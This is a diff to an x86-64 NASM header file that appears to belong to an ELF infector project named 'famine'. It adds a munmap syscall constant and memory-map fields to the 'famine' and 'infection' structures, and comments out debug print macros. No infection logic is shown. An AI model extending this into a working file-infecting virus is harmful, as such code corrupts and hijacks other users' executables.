@@ -5,6 +5,7 @@
 %define     SYS_CLOSE       3
 %define		SYS_LSEEK		8
 %define		SYS_MMAP		9
+%define		SYS_UNMAP		11
 
 ; OPEN
 %define		O_RDONLY			0x0000
@@ -47,10 +48,13 @@ struc famine
     .total_read:        resd    1
     .total_to_read:     resd    1
     .dirents_struct_ptr resq    1
+	.map_size	resq	1
 endstruc
 
 struc infection
 	.file_fd	resq	1
+	.map		resq	1
+	.map_size	resq	1
 endstruc
 
 ; ELF structures
@@ -85,20 +89,20 @@ struc	elf64_phdr
 	.p_align:		resq	1
 endstruc
 
-%macro writeWork 0
-    call _strlen
-    mov rdx, rax
-    mov rax, 1
-    mov rdi, 1
-    syscall
-%endmacro
+; %macro writeWork 0
+;     call _strlen
+;     mov rdx, rax
+;     mov rax, 1
+;     mov rdi, 1
+;     syscall
+; %endmacro
 
-%macro writeBack 0
-    mov rax, 1
-    mov rdi, 1
-    mov r13, rsi
-    mov rsi, back
-    mov rdx, 1
-    syscall
-    mov rsi, r13
-%endmacro
+; %macro writeBack 0
+;     mov rax, 1
+;     mov rdi, 1
+;     mov r13, rsi
+;     mov rsi, back
+;     mov rdx, 1
+;     syscall
+;     mov rsi, r13
+; %endmacro
